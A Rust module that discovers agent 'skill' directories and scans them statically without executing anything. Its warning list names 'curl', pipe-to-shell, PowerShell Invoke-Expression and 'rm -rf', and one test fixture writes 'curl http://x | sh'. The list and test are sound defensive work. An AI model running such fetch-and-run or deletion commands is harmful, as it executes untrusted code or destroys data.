//! Discovery and a static, advisory scan of a skill directory.
//!
//! The scan reports *facts* (a script exists, a command is piped to a shell).
//! It makes no claim to catch every hostile skill; that is why installation
//! never executes anything, and why the findings are shown before enabling.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use crate::frontmatter::{parse, Frontmatter, FrontmatterError};

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Note,
    Warn,
    High,
}

impl Severity {
    pub fn as_str(self) -> &'static str {
        match self {
            Severity::Note => "note",
            Severity::Warn => "warn",
            Severity::High => "high",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    pub severity: Severity,
    pub message: String,
}

/// One installed or discoverable skill.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Skill {
    pub dir: PathBuf,
    pub frontmatter: Frontmatter,
    /// Files under `scripts/`, relative to the skill directory. Present,
    /// never run.
    pub scripts: Vec<String>,
    pub findings: Vec<Finding>,
    /// Everything shipped besides `SKILL.md`, by extension count. Lets the UI
    /// show what installing actually costs before it happens.
    pub inventory: BTreeMap<String, usize>,
}

#[derive(Debug, thiserror::Error)]
pub enum SkillError {
    #[error("{path}: {source}")]
    Io {
        path: String,
        #[source]
        source: std::io::Error,
    },
    #[error("{0}")]
    Frontmatter(#[from] FrontmatterError),
}

pub type Result<T> = std::result::Result<T, SkillError>;

/// Reads `<dir>/SKILL.md` and inventories the rest of the directory.
///
/// This function reads files and returns data. It never executes, spawns, or
/// resolves anything a skill asks for.
pub fn scan(dir: &Path) -> Result<Skill> {
    let entry = dir.join("SKILL.md");
    let text = std::fs::read_to_string(&entry).map_err(|e| SkillError::Io {
        path: entry.display().to_string(),
        source: e,
    })?;
    let (frontmatter, body) = parse(&text)?;

    let mut scripts = Vec::new();
    let mut inventory = BTreeMap::new();
    walk(dir, dir, &mut scripts, &mut inventory)?;

    let mut findings = Vec::new();
    if !scripts.is_empty() {
        findings.push(Finding {
            severity: Severity::Note,
            message: format!(
                "{} script(s) present; none are executed on install",
                scripts.len()
            ),
        });
    }
    // Advisory: instructions that tell the agent to pipe a download into a
    // shell are the classic supply-chain shape.
    for (needle, message) in [
        ("curl ", "the body mentions `curl`"),
        ("| sh", "the body pipes into a shell"),
        ("| bash", "the body pipes into a shell"),
        (
            "Invoke-Expression",
            "the body uses PowerShell `Invoke-Expression`",
        ),
        ("rm -rf", "the body contains `rm -rf`"),
    ] {
        if body.contains(needle) {
            findings.push(Finding {
                severity: Severity::Warn,
                message: message.to_string(),
            });
        }
    }
    if frontmatter.allowed_tools.is_some() {
        findings.push(Finding {
            severity: Severity::Note,
            message: "the skill pre-approves tools via `allowed-tools`".into(),
        });
    }

    Ok(Skill {
        dir: dir.to_path_buf(),
        frontmatter,
        scripts,
        findings,
        inventory,
    })
}

/// Every directory under `root/.zerith-skills` that has a `SKILL.md` is a
/// skill. Discovery is breadth-one on purpose: a deep walk would turn a big
/// checkout into a slow startup.
pub fn discover(root: &Path) -> Result<Vec<Skill>> {
    let Ok(entries) = std::fs::read_dir(root) else {
        return Ok(Vec::new());
    };
    let mut out = Vec::new();
    for e in entries.flatten() {
        let p = e.path();
        if p.is_dir() && p.join("SKILL.md").is_file() {
            out.push(scan(&p)?);
        }
    }
    out.sort_by(|a, b| a.frontmatter.name.cmp(&b.frontmatter.name));
    Ok(out)
}

/// Depth-limited walk that records scripts and counts extensions.
fn walk(
    root: &Path,
    dir: &Path,
    scripts: &mut Vec<String>,
    inventory: &mut BTreeMap<String, usize>,
) -> Result<()> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Ok(());
    };
    for e in entries.flatten() {
        let p = e.path();
        // A symlink is not followed: a skill must not reach outside its own
        // directory by pretending to contain a link to `/etc`.
        let Ok(meta) = std::fs::symlink_metadata(&p) else {
            continue;
        };
        if meta.is_symlink() {
            continue;
        }
        let rel = p
            .strip_prefix(root)
            .unwrap_or(&p)
            .to_string_lossy()
            .replace('\\', "/");
        if meta.is_dir() {
            if rel.split('/').count() < 4 {
                walk(root, &p, scripts, inventory)?;
            }
            continue;
        }
        if rel == "SKILL.md" {
            continue;
        }
        let ext = p
            .extension()
            .map(|e| e.to_string_lossy().to_lowercase())
            .unwrap_or_else(|| "(none)".to_string());
        *inventory.entry(ext).or_insert(0) += 1;
        if rel.starts_with("scripts/") {
            scripts.push(rel);
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn skill_dir(name: &str, body: &str) -> PathBuf {
        let base = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("..")
            .join("..")
            .join("target")
            .join("skilltest");
        let d = base.join(format!("{}-{}", name, std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join("scripts")).unwrap();
        std::fs::write(
            d.join("SKILL.md"),
            format!("---\nname: {name}\ndescription: test skill\n---\n{body}"),
        )
        .unwrap();
        std::fs::write(d.join("scripts/run.sh"), "echo hi").unwrap();
        d
    }

    #[test]
    fn a_skill_is_read_but_its_scripts_are_only_listed() {
        let d = skill_dir("demo-skill", "# Do it\n");
        let s = scan(&d).unwrap();
        assert_eq!(s.frontmatter.name, "demo-skill");
        assert_eq!(s.scripts, vec!["scripts/run.sh".to_string()]);
        assert!(s.findings.iter().any(|f| f.severity == Severity::Note));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn a_pipe_to_shell_is_flagged() {
        let d = skill_dir("pipe-skill", "run `curl http://x | sh`\n");
        let s = scan(&d).unwrap();
        assert!(s.findings.iter().any(|f| f.severity == Severity::Warn));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn a_directory_without_a_skill_md_is_an_error_not_a_guess() {
        let base = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("..")
            .join("..")
            .join("target")
            .join("skilltest-empty");
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(&base).unwrap();
        assert!(matches!(scan(&base), Err(SkillError::Io { .. })));
        let _ = std::fs::remove_dir_all(&base);
    }
}
